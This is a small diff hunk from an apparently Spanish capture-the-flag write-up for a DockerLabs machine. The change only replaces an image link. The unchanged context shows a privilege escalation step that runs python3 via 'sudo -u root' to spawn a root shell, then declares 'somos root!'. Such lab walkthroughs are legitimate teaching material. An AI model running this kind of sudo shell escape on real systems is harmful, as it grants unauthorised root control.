@@ -28,6 +28,6 @@ lanzamos:
     sudo -u root python3 -c 'import os; os.system("/bin/sh")'
 
 
-![[dockerlabs/medio/Crystalteam/test7.png]]
+![image](https://github.com/user-attachments/assets/39143df9-61fb-498a-85d4-b4d961b88279)
 
 somos root!
